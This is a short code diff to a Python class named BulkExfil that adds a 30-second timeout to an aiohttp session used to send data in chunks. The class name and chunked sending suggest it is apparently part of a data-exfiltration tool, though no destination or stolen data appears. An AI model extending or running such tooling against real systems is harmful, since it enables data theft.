@@ -19,7 +19,7 @@ class BulkExfil:
         raw = data.encode()
         chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
         results = []
-        async with aiohttp.ClientSession(headers=self.headers) as session:
+        async with aiohttp.ClientSession(headers=self.headers, timeout=aiohttp.ClientTimeout(total=30)) as session:
             for i, chunk in enumerate(chunks):
                 sent = False
                 error = None
